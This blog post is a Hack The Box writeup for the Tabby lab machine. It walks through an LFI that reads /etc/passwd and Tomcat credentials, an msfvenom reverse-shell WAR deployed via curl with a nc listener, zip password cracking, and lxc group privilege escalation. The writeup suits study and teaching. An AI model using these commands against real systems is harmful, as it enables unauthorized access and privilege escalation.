---
layout: post
title:  "HTB Tabby writeup"
date:   2020-12-08 18:00:00 +0300
categories: HTB_writeup
summary: This is my first attempt at making a writeup for a Hackthebox machine. It contains my notes on how I obtained both the user and root flag on the Tabby machine.  
---

This is my first attempt at making a writeup for a Hackthebox machine. It contains my notes on how I obtained both the user and root flag on the Tabby machine.  

![Tabby info card]({{site.baseurl}}/assets/img/HTB/tabby/info_card.png){: .center-image}
[Tabby](https://www.hackthebox.eu/home/machines/profile/259) is a Linux machine released on 2020-06-20 and its difficulty level was <b>easy</b>.

### Recon
We begin this by running a port scan with nmap (actually zenmap).
{%highlight bash%}
nmap -p- -T4 -A -v 10.10.10.194
# This is also the command used by using "Intense scan, all TCP ports" in zenmap
{%endhighlight%}
![Port Scan]({{site.baseurl}}/assets/img/HTB/tabby/port_scan.png){: .center-image}
We can see that this machine is exposing 3 services: ssh on port 22, an Apache web server on port 80 and a tomcat server on port 8080.


### Web server (port 80)
First, we should take a look at the http server running on port 80.
![Web page]({{site.baseurl}}/assets/img/HTB/tabby/front_page.png){: .center-image}
The first thing that we notice is the megahosting.htb domain. We might have to add that to /etc/hosts later.  
Looking around on this webpage, we cannot find any significant features and we see that lots of pages seem to be broken.
You can even find some pages indicating a previous data breach.

By taking a look at the code, we see an URL that has a 'file' URL parameter.
![Web page]({{site.baseurl}}/assets/img/HTB/tabby/lfi_code.png){: .center-image}

This hints at a possible Local-File Inclusion (LFI) vulnerability.  
We test this with some files that belong to the web app (ex: index.html) and then try accessing /etc/passwd (we already know this is running on Linux).
{%highlight bash%}
curl http://10.10.10.194/news.php\?file\=statement\?news.php\?file\=../../../../../../../../etc/passwd
{%endhighlight%}
![/etc/passwd contents]({{site.baseurl}}/assets/img/HTB/tabby/etc_passwd.png){: .center-image}

After looking around these pages without finding anything else that appeared to be useful I decided to start looking at the tomcat server.

### Tomcat (port 8080)
We can find the default Tomcat page on port 8080. We could access the manager_webapp page and the host-manager_webapp if we would have a valid account.  
First, we try some commonly used credentials like tomcat/tomcat, admin/s3cret, etc. None of these work for this instance of tomcat.  

A good approach here would be trying to obtain the file containing tomcat users (tomcat-users.xml) by exploiting the LFI vulnerability that we found.  
On the first page, we are informed that CATALINA_HOME is in <b>/usr/share/tomcat9</b> and CATALINA_BASE is in <b>/var/lib/tomcat9</b> so these paths might be good places to start looking.  
Also, when we enter an invalid set of credentials we are informed that tomcat-users.xml would be found at /conf/tomcat-users.xml in CATALINA_BASE.  
Trying to get the file at /usr/share/tomcat9/conf/tomcat-users.xml does not return anything.  
After some trial and error, I found a stackoverflow.com post that indicated more default locations for tomcat-users.xml.  
The one that worked was /usr/share/tomcat9/etc/tomcat-users.xml. We can now see the password for the tomcat account.

![Tomcat password]({{site.baseurl}}/assets/img/HTB/tabby/password.png){: .center-image}

### Getting a shell

When we try to use the newly found credentials in the manager web UI, the login fails. This is probably because tomcat does not have the manager-gui role. 
To get around this, we'll upload our payload using the deploy endpoint & cURL.  
First, we'll create a payload (a reverse shell) using msfvenom. Then, we'll upload it to the server using the tomcat account.
And after that we'll open a listener using nc and go to the URL coresponding to our payload in a browser in order to run it.  

{%highlight bash%}
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.62 lport=1337 -f war -o n00b.war
export pass=\$3cureP4s5w0rd123!
curl -v -u tomcat:$pass --upload-file n00b.war "http://10.10.10.194:8080/manager/text/deploy?path=/n00b&update=true"
{%endhighlight%}
Note1: The password contained a <i>$</i> character. The easiest way to include that was to put it in a variable and use it like that.

![Deploying the payload]({{site.baseurl}}/assets/img/HTB/tabby/deploy_payload.png){: .center-image}
Then we start the nc listener and we got our first shell running as tomcat.

{%highlight bash%}
nc -lvp 1234
{%endhighlight%}

![Reverse shell]({{site.baseurl}}/assets/img/HTB/tabby/first_reverse_shell.png){: .center-image}

### Obtaining user-level access (privilege escalation 01)

We notice that python3 is installed on this machine.  
To make things easier, the first thing that we do is upgrading our shell to an interactive TTY using python.  
![Upgrading the shell]({{site.baseurl}}/assets/img/HTB/tabby/shell_upgrade.png){: .center-image}

We start looking for methods that we could use to elevate our privileges and gain access as the <b>ash</b> user instead of <b>tomcat</b>.  
One of the locations that I looked at was the root directory used by the apache web server. Among files that belong to the web app that is running on port 80 there is an archive named 16162020_backup.zip
![backup archive]({{site.baseurl}}/assets/img/HTB/tabby/backup_location.png){: .center-image}
Backups might contain sensitive or useful information so we use nc to transfer this file to our machine.

![Transfering backup.zip]({{site.baseurl}}/assets/img/HTB/tabby/nc_transfer_1.png){: .center-image}
The zip file is password protected.  
However, we can try to brute-force the password using fcrackzip and a wordlist (I used rockyou.txt in this case).  
Using this method, the password for the archive is found quite fast.  
![Password found]({{site.baseurl}}/assets/img/HTB/tabby/pw_found.png){: .center-image}
### The user flag
Analyzing the contents of the backup archive did not yield any useful information.  
However, there is another common mistake that could be involved here: <b>password reuse</b>.  
We try to use that password while logging in as <b>ash</b> and it works.  
We can now also retrieve the user flag from the user's home.

![User flag]({{site.baseurl}}/assets/img/HTB/tabby/user_flag.png){: .center-image}
### Obtaining root-level access (privilege escalation 02)
Now that we have access to the ash user's account we should try to gain root-level access.  
Among the first things that we check is the list of groups that a user belongs to. The group that grabs our attention for this user is <b>lxc</b>.
![Groups]({{site.baseurl}}/assets/img/HTB/tabby/groups.png){: .center-image}

Lxc is a technology used to run containers on a linux system. The level of access needed for that might be useful for escalating privileges.  
We start looking around on the Internet for more information on LXC and possible methods of exploitinig it in order to gain more access.  
We find a [blogpost](https://www.hackingarticles.in/lxd-privilege-escalation/) detailing how to use lxc or lxd in order to get root-level access.

First, we clone the alpine-builder [repository](https://github.com/saghul/lxd-alpine-builder) from GitHub and run <b>build-alpine</b>.  
Then, we use netcat to transfer the generated binary to our target machine.  
On the target machine, we import the image and create a new container based on that image.  

{%highlight bash %}
# Importing image
lxc image import ./alpine-v3.12-x86_64-20201121_1111 --alias test01

# Creating new container
lxc init test01 testimg -c security.privileged=true

# Add the root of the host filesystem to the container and mount it at /mnt/root
lxc config device add testimg mydevice disk source=/ path=/mnt/root recursive=true

# Start the new container
lxc start testimg

# Run sh inside the container
lxc exec testimg /bin/sh
{%endhighlight%}

![LXC import]({{site.baseurl}}/assets/img/HTB/tabby/lxc_import.png){: .center-image}


### The root flag
The exploit described above works well and we can now access any file from the host's filesystem.  
We use that in order to read the root flag.
![Root flag]({{site.baseurl}}/assets/img/HTB/tabby/root_flag.png){: .center-image}

And then we clean up by deleting the container, image and other binaries that we might've left behind while doing this (it was done when the machine was still public so other people were connecting to it too).
